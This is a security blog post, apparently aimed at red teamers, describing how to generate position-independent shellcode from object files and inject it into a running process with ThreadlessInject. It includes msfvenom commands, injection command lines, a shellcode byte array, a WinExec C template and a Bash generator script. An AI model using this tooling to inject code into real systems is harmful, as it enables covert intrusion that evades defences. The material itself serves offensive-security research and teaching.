@@ -1,0 +1,325 @@
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Adopting Position Independent Shellcodes from Object Files in Memory for Threadless Injection | snovvcrash@gh-pages:~$ _</title>
+<meta name="generator" content="Jekyll v3.9.5">
+<meta property="og:title" content="Adopting Position Independent Shellcodes from Object Files in Memory for Threadless Injection">
+<meta name="author" content="snovvcrash">
+<meta property="og:locale" content="ru_RU">
+<meta name="description" content="In this blog I will describe a way to automate generation of Position Independent Shellcodes from object files in memory (by @NinjaParanoid) to be used in Threadless Process Injection (by @_EthicalChaos_).">
+<meta property="og:description" content="In this blog I will describe a way to automate generation of Position Independent Shellcodes from object files in memory (by @NinjaParanoid) to be used in Threadless Process Injection (by @_EthicalChaos_).">
+<link rel="canonical" href="https://snovvcrash.github.io/2023/02/14/pic-generation-for-threadless-injection.html">
+<meta property="og:url" content="https://snovvcrash.github.io/2023/02/14/pic-generation-for-threadless-injection.html">
+<meta property="og:site_name" content="snovvcrash@gh-pages:~$ _">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-02-14T05:00:00+03:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="Adopting Position Independent Shellcodes from Object Files in Memory for Threadless Injection">
+<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-NWFJ35HFYR&amp;l=dataLayer&amp;cx=c"></script><script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snovvcrash"},"dateModified":"2023-02-14T05:00:00+03:00","datePublished":"2023-02-14T05:00:00+03:00","description":"In this blog I will describe a way to automate generation of Position Independent Shellcodes from object files in memory (by @NinjaParanoid) to be used in Threadless Process Injection (by @_EthicalChaos_).","headline":"Adopting Position Independent Shellcodes from Object Files in Memory for Threadless Injection","mainEntityOfPage":{"@type":"WebPage","@id":"https://snovvcrash.github.io/2023/02/14/pic-generation-for-threadless-injection.html"},"url":"https://snovvcrash.github.io/2023/02/14/pic-generation-for-threadless-injection.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/custom.css">
+  <!-- <link rel="stylesheet" href="/assets/css/terminal.css"> --><!-- Global Site Tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-123831726-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-123831726-1');
+</script>
+<script async="" defer="" src="https://buttons.github.io/buttons.js"></script>
+<!-- Icons made by https://www.freepik.com/ from https://www.flaticon.com/ -->
+  <!-- Favicon pack generated with https://realfavicongenerator.net/ -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+<a class="site-title" rel="author" href="/">snovvcrash@gh-pages:~$ _</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger">
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+          <a rel="me" href="https://infosec.exchange/@snovvcrash"></a>
+          <a class="page-link" href="https://ppn.snovvcrash.rocks/">PPN</a><a class="page-link" href="/tags">Tags</a><a class="page-link" href="/about">About</a><a class="page-link" href="https://boosty.to/snovvcrash">Sponsor</a>
+        </div>
+      </nav>
+</div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Adopting Position Independent Shellcodes from Object Files in Memory for Threadless Injection</h1>
+    <p class="post-meta">
+
+  <span class="tag-list"><a href="/tags.html#maldev" class="post-tag">maldev</a> <a href="/tags.html#threadless-injection" class="post-tag">threadless-injection</a> <a href="/tags.html#function-stomping" class="post-tag">function-stomping</a> <a href="/tags.html#shellcode-injection" class="post-tag">shellcode-injection</a> <a href="/tags.html#shellcode-generation" class="post-tag">shellcode-generation</a> <a href="/tags.html#pic" class="post-tag">pic</a> <a href="/tags.html#winexec" class="post-tag">winexec</a> <a href="/tags.html#msfvenom" class="post-tag">msfvenom</a> </span><br><br>
+
+<time class="dt-published" datetime="2023-02-14T05:00:00+03:00" itemprop="datePublished">Feb 14, 2023
+      </time>• <span itemprop="author" itemscope="" itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">snovvcrash </span></span>• <span class="time">9 minutes to read </span></p>
+    <style>
+      .post-content h1 {font-size: 30px; color: #8cd2d5;}
+      .post-content h2 {font-size: 26px; color: #8cd2d5;}
+      .post-content h3 {font-size: 22px; color: #8cd2d5;}
+      .post-content h4 {font-size: 18px; color: #8cd2d5;}
+    </style>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>In this blog I will describe a way to automate generation of Position Independent Shellcodes from object files in memory (by @NinjaParanoid) to be used in Threadless Process Injection (by @_EthicalChaos_).</p>
+
+<!--cut-->
+
+<p class="center-image"><a href="/assets/images/pic-generation-for-threadless-injection/banner.png"><img src="/assets/images/pic-generation-for-threadless-injection/banner.png" alt="banner.png"></a></p>
+
+<ul id="markdown-toc">
+  <li><a href="#function-stomping--threadless-injection" id="markdown-toc-function-stomping--threadless-injection">Function Stomping / Threadless Injection</a></li>
+  <li><a href="#pop-the-calc-shellcode" id="markdown-toc-pop-the-calc-shellcode">Pop-the-Calc Shellcode</a></li>
+  <li><a href="#wheres-the-detonator-generator" id="markdown-toc-wheres-the-detonator-generator">Where’s the <strike>Detonator</strike> Generator?</a></li>
+  <li><a href="#pic-from-object-files" id="markdown-toc-pic-from-object-files">PIC from Object Files</a></li>
+  <li><a href="#references" id="markdown-toc-references">References</a></li>
+</ul>
+
+<h2 id="function-stomping--threadless-injection">Function Stomping / Threadless Injection</h2>
+
+<p>One of the items from my endless TODO-list that I never crossed out was the topic of <a href="https://idov31.github.io/2022/01/28/function-stomping.html">Function Stomping</a> by <a href="https://twitter.com/Idov31">Ido Veltzman</a>. Luckily, <a href="https://twitter.com/_EthicalChaos_">Ceri Coburn</a> <a href="https://twitter.com/_EthicalChaos_/status/1624520767483310081">presented</a> an awesome <a href="https://github.com/CCob/ThreadlessInject/blob/master/Needles%20without%20the%20Thread.pptx">research</a> on Threadless Process Injection accompanying a ready-to-use <a href="https://github.com/CCob/ThreadlessInject">injector in C#</a> which made me get back to that long-forgotten TODO.</p>
+
+<h2 id="pop-the-calc-shellcode">Pop-the-Calc Shellcode</h2>
+
+<p>While playing with ThreadlessInject and <a href="https://twitter.com/snovvcrash/status/1624944014263713796">porting</a> it to the <a href="https://github.com/TheWover/DInvoke">DInvoke</a> API, one of the obvious desires of mine was to test it with a different shellcode. As a Proof-of-Concept Ceri provides a classic <a href="https://github.com/CCob/ThreadlessInject/blob/c41df117e74b3413a8ed12ba5882058057253aac/Program.cs#L73-L82">Pop-the-Calc</a> shellcode which works smoothly but may not be enough during a real engagement:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$notepadId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Start-Process</span><span class="w"> </span><span class="nx">notepad</span><span class="w"> </span><span class="nt">-PassThru</span><span class="p">)</span><span class="o">.</span><span class="nf">Id</span><span class="p">;</span><span class="w"> </span><span class="o">.</span><span class="n">\ThreadlessInject.exe</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nv">$notepadId</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">kernel32.dll</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">OpenProcess</span><span class="w">
+</span></code></pre></div></div>
+
+<p class="center-image"><a href="/assets/images/pic-generation-for-threadless-injection/threadless-inject-calc.png"><img src="/assets/images/pic-generation-for-threadless-injection/threadless-inject-calc.png" alt="threadless-inject-calc.png"></a></p>
+
+<p class="quote">Hackers looove popping calcs!</p>
+
+<p>Well, what will a hacker do to generate a shellcode? Summon <code class="language-plaintext highlighter-rouge">msfvenom</code>, of course:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">~$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">CMD</span><span class="o">=</span>calc.exe <span class="nt">-f</span> raw <span class="nt">-o</span> msf-calc.bin
+</code></pre></div></div>
+
+<p>Providing the <code class="language-plaintext highlighter-rouge">msf-calc.bin</code> shellcode to ThreadlessInject.exe with <code class="language-plaintext highlighter-rouge">-x</code> option expectedly results in exiting the target process after calc has been spawned:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$notepadId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Start-Process</span><span class="w"> </span><span class="nx">notepad</span><span class="w"> </span><span class="nt">-PassThru</span><span class="p">)</span><span class="o">.</span><span class="nf">Id</span><span class="p">;</span><span class="w"> </span><span class="o">.</span><span class="n">\ThreadlessInject.exe</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="o">.</span><span class="nx">\msf-calc.bin</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nv">$notepadId</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">kernel32.dll</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">OpenProcess</span><span class="w">
+</span></code></pre></div></div>
+
+<p class="center-image"><a href="/assets/images/pic-generation-for-threadless-injection/threadless-inject-msf.gif"><img src="/assets/images/pic-generation-for-threadless-injection/threadless-inject-msf.gif" alt="threadless-inject-msf.gif"></a></p>
+
+<p class="quote">Unwanted termination of parent process with MSF shellcode</p>
+
+<p>Changing the <code class="language-plaintext highlighter-rouge">EXITFUNC=</code> option during the generation process doesn’t seem to be helpful:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">~$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">CMD</span><span class="o">=</span>calc.exe <span class="nv">EXITFUNC</span><span class="o">=</span>none <span class="nt">-f</span> raw <span class="nt">-o</span> msf-calc-none.bin
+<span class="gp">~$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">CMD</span><span class="o">=</span>calc.exe <span class="nv">EXITFUNC</span><span class="o">=</span>process <span class="nt">-f</span> raw <span class="nt">-o</span> msf-calc-process.bin
+<span class="gp">~$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">CMD</span><span class="o">=</span>calc.exe <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> raw <span class="nt">-o</span> msf-calc-thread.bin
+</code></pre></div></div>
+
+<p>It’s a <a href="https://rastating.github.io/altering-msfvenom-exec-payload-to-work-without-exitfunc/">known</a> thing that MSF-exec payloads are better to be started from a fresh thread ‘cause the shellcode doesn’t treat the stack gently. Furthermore, a hint about the required shellcode behavior is kindly left by the author of ThreadlessInject <a href="https://github.com/CCob/ThreadlessInject/blob/master/Program.cs#L73">in the comments</a>:</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// x64 calc shellcode function with ret as default if no shellcode supplied</span>
+<span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">x64</span> <span class="p">=</span> <span class="p">{</span>
+    <span class="m">0x53</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x55</span><span class="p">,</span> <span class="m">0x54</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0x66</span><span class="p">,</span> <span class="m">0x83</span><span class="p">,</span> <span class="m">0xE4</span><span class="p">,</span> <span class="m">0xF0</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x6A</span><span class="p">,</span>
+    <span class="m">0x60</span><span class="p">,</span> <span class="m">0x5A</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x63</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x6C</span><span class="p">,</span> <span class="m">0x63</span><span class="p">,</span> <span class="m">0x54</span><span class="p">,</span> <span class="m">0x59</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x29</span><span class="p">,</span> <span class="m">0xD4</span><span class="p">,</span>
+    <span class="m">0x65</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x32</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x76</span><span class="p">,</span> <span class="m">0x18</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x76</span><span class="p">,</span> <span class="m">0x10</span><span class="p">,</span>
+    <span class="m">0x48</span><span class="p">,</span> <span class="m">0xAD</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x7E</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x03</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x3C</span><span class="p">,</span>
+    <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x5C</span><span class="p">,</span> <span class="m">0x17</span><span class="p">,</span> <span class="m">0x28</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x1F</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xFE</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span>
+    <span class="m">0x54</span><span class="p">,</span> <span class="m">0x1F</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0x0F</span><span class="p">,</span> <span class="m">0xB7</span><span class="p">,</span> <span class="m">0x2C</span><span class="p">,</span> <span class="m">0x17</span><span class="p">,</span> <span class="m">0x8D</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x02</span><span class="p">,</span> <span class="m">0xAD</span><span class="p">,</span> <span class="m">0x81</span><span class="p">,</span>
+    <span class="m">0x3C</span><span class="p">,</span> <span class="m">0x07</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x6E</span><span class="p">,</span> <span class="m">0x45</span><span class="p">,</span> <span class="m">0x75</span><span class="p">,</span> <span class="m">0xEF</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x1F</span><span class="p">,</span> <span class="m">0x1C</span><span class="p">,</span>
+    <span class="m">0x48</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xFE</span><span class="p">,</span> <span class="m">0x8B</span><span class="p">,</span> <span class="m">0x34</span><span class="p">,</span> <span class="m">0xAE</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xF7</span><span class="p">,</span> <span class="m">0x99</span><span class="p">,</span> <span class="m">0xFF</span><span class="p">,</span> <span class="m">0xD7</span><span class="p">,</span>
+    <span class="m">0x48</span><span class="p">,</span> <span class="m">0x83</span><span class="p">,</span> <span class="m">0xC4</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x5C</span><span class="p">,</span> <span class="m">0x5D</span><span class="p">,</span> <span class="m">0x5F</span><span class="p">,</span> <span class="m">0x5E</span><span class="p">,</span> <span class="m">0x5B</span><span class="p">,</span> <span class="m">0xC3</span> <span class="p">};</span>
+</code></pre></div></div>
+
+<p>That is to say, the <code class="language-plaintext highlighter-rouge">ret</code> instruction should be supplied when the shellcode’s job is done in order to return the execution flow back to the caller (i. e., <a href="https://github.com/CCob/ThreadlessInject/blob/c41df117e74b3413a8ed12ba5882058057253aac/Program.cs#L117">the assembly stub</a>) as well as proper stack alignment should be performed with registers preserved. So let’s take a look at both shellcodes side-by-side with objdump.</p>
+
+<p class="center-image"><a href="/assets/images/pic-generation-for-threadless-injection/pop-the-calc-comparison.png"><img src="/assets/images/pic-generation-for-threadless-injection/pop-the-calc-comparison.png" alt="pop-the-calc-comparison.png"></a></p>
+
+<p class="quote">Comparing calc shellcodes</p>
+
+<p>As we can see no <code class="language-plaintext highlighter-rouge">ret</code> is observed within the MSF shellcode… Dunno whether the dynamic way of MSF generator puts the <code class="language-plaintext highlighter-rouge">CMD=</code> value onto the stack (via that <code class="language-plaintext highlighter-rouge">call rbp</code> instruction) does also negatively impacts our situation but we definitely don’t get desired behavior – the parent process dies.</p>
+
+<p>So what can we do about it?</p>
+
+<h2 id="wheres-the-detonator-generator">Where’s the <strike>Detonator</strike> Generator?</h2>
+
+<p>Honestly, I don’t know any other FOSS shellcode generator besides <code class="language-plaintext highlighter-rouge">msfvenom</code> so I started to google <img class="emoji" title=":man_shrugging:" alt=":man_shrugging:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f937-2642.png" height="20" width="20"> Btw, the builtin default shellcode for ThreadlessInject is as old as time and can be found in numerous GitHub repos and <a href="https://gist.github.com/dmchell/51b8c040402e6f13bacbed317335daea#file-csinjcy-L35">gists</a>.</p>
+
+<p>Among other things, I considered the following options:</p>
+
+<ul>
+  <li>Look for less-known open source shellcode generators for Windows x64 – failed due to a total lack of them (though <a href="https://github.com/ommadawn46/win-x86-shellcoder">win-x86-shellcoder</a> seems to be a nice project for x86).</li>
+  <li>Use an existing Pop-the-Calc <code class="language-plaintext highlighter-rouge">.asm</code> file as template for generating a WinExec shellcode with an arbitrary argument (OS command) – failed due to me being lazy. Good examples of such ‘static’ calc shellcodes (with a static <code class="language-plaintext highlighter-rouge">lpCmdLine</code> argument for WinExec) are <a href="https://github.com/peterferrie/win-exec-calc-shellcode">win-exec-calc-shellcode</a> and <a href="https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode">x64win-DynamicNoNull-WinExec-PopCalc-Shellcode</a> by <a href="https://twitter.com/0xBoku">Bobby Cooke</a>.</li>
+  <li>Play with popular PE → shellcode techniques like <a href="https://github.com/monoxgas/sRDI">sRDI</a>, <a href="https://github.com/TheWover/donut">donut</a>, <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a>, etc.</li>
+</ul>
+
+<p>While testing the 3rd option I came along this terrific article by <a href="https://twitter.com/KlezVirus">@KlezVirus</a> – <a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/">From Process Injection to Function Hijacking</a> – which covers Function Stomping topic <strong>in great depth</strong> (one more blogpost in my TODOs).</p>
+
+<p>As I was looking for a quick example to be used with ThreadlessInject, my attention was caught by one of the references to another blog of maldev magician <a href="https://twitter.com/NinjaParanoid">Chetan Nayak</a> – <a href="https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/">Executing Position Independent Shellcode from Object Files in Memory</a> – which we shall focus on further.</p>
+
+<p><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> The same technique is used by <a href="https://twitter.com/hasherezade">Aleksandra Doniec</a> in <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a> and by <a href="https://twitter.com/KlezVirus">@KlezVirus</a> in <a href="https://github.com/klezVirus/inceptor/blob/dev/inceptor/pic-generator.py">inceptor</a>.</p>
+
+<h2 id="pic-from-object-files">PIC from Object Files</h2>
+
+<p>In his blog Chetan provides a way to build a C function with a small assembly stub for proper stack alignment and returning to the caller gracefully.</p>
+
+<blockquote>
+  <p>In order to make sure that our shellcode is always stack aligned, we will write a small assembly stub which will align the stack and call our C function which would act as our entrypoint. We will convert this assembly code to an object file which we will later link to our C source code. – Chetan Nayak (@NinjaParanoid)</p>
+</blockquote>
+
+<p class="center-image"><a href="/assets/images/pic-generation-for-threadless-injection/bruteratel-alignstack.png"><img src="/assets/images/pic-generation-for-threadless-injection/bruteratel-alignstack.png" alt="bruteratel-alignstack.png"></a></p>
+
+<p class="quote">alignstack assembly stub (bruteratel.com)</p>
+
+<p>With the ability to dynamically resolve exported symbols of WinExec (which resides within <code class="language-plaintext highlighter-rouge">kernel32.dll</code>) we can extract the opcodes from the compiled binary and use them as a Position Independent shellcode. That’s exactly what we need!</p>
+
+<p>I shall git clone his demo <a href="https://github.com/paranoidninja/PIC-Get-Privileges">repository</a> and write a template to execute a command of my choice using WinExec based on the given example of constructing the <code class="language-plaintext highlighter-rouge">getprivs</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// template.c</span>
+
+<span class="cp">#include</span> <span class="cpf">"addresshunter.h"</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="k">typedef</span> <span class="nf">UINT</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">WINEXEC</span><span class="p">)(</span><span class="n">LPCSTR</span><span class="p">,</span> <span class="n">UINT</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">exec</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">UINT64</span> <span class="n">kernel32dll</span><span class="p">;</span>
+    <span class="n">UINT64</span> <span class="n">WinExecFunc</span><span class="p">;</span>
+
+    <span class="n">kernel32dll</span> <span class="o">=</span> <span class="n">GetKernel32</span><span class="p">();</span>
+
+    <span class="n">CHAR</span> <span class="n">winexec_c</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">'W'</span><span class="p">,</span><span class="sc">'i'</span><span class="p">,</span><span class="sc">'n'</span><span class="p">,</span><span class="sc">'E'</span><span class="p">,</span><span class="sc">'x'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'c'</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
+    <span class="n">WinExecFunc</span> <span class="o">=</span> <span class="n">GetSymbolAddress</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">kernel32dll</span><span class="p">,</span> <span class="n">winexec_c</span><span class="p">);</span>
+
+    <span class="n">CHAR</span> <span class="n">cmd_c</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="err">'</span><span class="o">&lt;</span><span class="n">CMD</span><span class="o">&gt;</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
+    <span class="p">((</span><span class="n">WINEXEC</span><span class="p">)</span><span class="n">WinExecFunc</span><span class="p">)(</span><span class="n">cmd_c</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">SHOWWINDOW</span><span class="o">&gt;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Then with a bit of Bash automation we get a working alternative for the MSF <code class="language-plaintext highlighter-rouge">windows/x64/exec CMD= -f raw</code> payload generator:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env bash</span>
+
+<span class="c"># Usage:</span>
+<span class="c">#   generate.sh &lt;CMD&gt; &lt;SHOWWINDOW&gt;</span>
+<span class="c"># Examples:</span>
+<span class="c">#   generate.sh 'calc.exe' 10</span>
+<span class="c">#   generate.sh 'cmd /c "whoami /all" &gt; C:\Windows\Tasks\out.txt' 0</span>
+
+<span class="nv">CMD</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">1</span><span class="k">}</span><span class="s2">"</span>
+<span class="nv">SHOWWINDOW</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">2</span><span class="k">}</span><span class="s2">"</span>  <span class="c"># https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</span>
+
+<span class="nv">CMD</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">CMD</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-o</span> <span class="nb">.</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s1">':a;N;$!ba;s/\n/\x27,\x27/g'</span><span class="sb">`</span>
+<span class="nv">CMD</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">CMD</span><span class="p">//\\/\\\\\\\\</span><span class="k">}</span><span class="s2">"</span>
+
+<span class="nb">cat </span>template.c | <span class="nb">sed</span> <span class="s2">"s#&lt;CMD&gt;#</span><span class="k">${</span><span class="nv">CMD</span><span class="k">}</span><span class="s2">#g"</span> | <span class="nb">sed</span> <span class="s2">"s#&lt;SHOWWINDOW&gt;#</span><span class="k">${</span><span class="nv">SHOWWINDOW</span><span class="k">}</span><span class="s2">#g"</span> <span class="o">&gt;</span> exec.c
+<span class="c">#cat exec.c | grep cmd_c</span>
+
+nasm <span class="nt">-f</span> win64 adjuststack.asm <span class="nt">-o</span> adjuststack.o
+
+x86_64-w64-mingw32-gcc exec.c <span class="nt">-Wall</span> <span class="nt">-m64</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fno-asynchronous-unwind-tables</span> <span class="nt">-nostdlib</span> <span class="nt">-fno-ident</span> <span class="nt">-O2</span> <span class="nt">-c</span> <span class="nt">-o</span> exec.o <span class="nt">-Wl</span>,-Tlinker.ld,--no-seh
+
+x86_64-w64-mingw32-ld <span class="nt">-s</span> adjuststack.o exec.o <span class="nt">-o</span> exec.exe
+
+<span class="nb">echo</span> <span class="nt">-e</span> <span class="sb">`</span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> exec.exe | <span class="nb">grep</span> <span class="s2">"^ "</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="se">\x</span><span class="nv">$i</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span><span class="sb">`</span> <span class="o">&gt;</span> exec.bin
+
+<span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> exec.bin <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[*] Payload size: </span><span class="sb">`</span><span class="nb">stat</span> <span class="nt">-c</span>%s exec.bin<span class="sb">`</span><span class="s2"> bytes"</span>
+    <span class="nb">echo</span> <span class="s2">"[+] Saved as: exec.bin"</span>
+<span class="k">fi
+
+</span><span class="nb">rm </span>exec.exe exec.o exec.c adjuststack.o
+</code></pre></div></div>
+
+<p>Generate and execute:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">~$</span><span class="w"> </span>./generate.sh <span class="s1">'cmd /c "whoami /all" &gt; C:\Windows\Tasks\out.txt'</span> 0
+<span class="go">[*] Payload size: 640 bytes
+[+] Saved as: exec.bin
+</span></code></pre></div></div>
+
+<p class="center-image"><a href="/assets/images/pic-generation-for-threadless-injection/threadless-inject-exec.png"><img src="/assets/images/pic-generation-for-threadless-injection/threadless-inject-exec.png" alt="threadless-inject-exec.png"></a></p>
+
+<p class="quote">Execution of the customly generated shellcode</p>
+
+<p>Happy hacking!</p>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://github.com/CCob/ThreadlessInject">https://github.com/CCob/ThreadlessInject</a></li>
+  <li><a href="https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/">https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/</a></li>
+  <li><a href="https://github.com/paranoidninja/PIC-Get-Privileges">https://github.com/paranoidninja/PIC-Get-Privileges</a></li>
+  <li><a href="https://idov31.github.io/2022/01/28/function-stomping.html">https://idov31.github.io/2022/01/28/function-stomping.html</a></li>
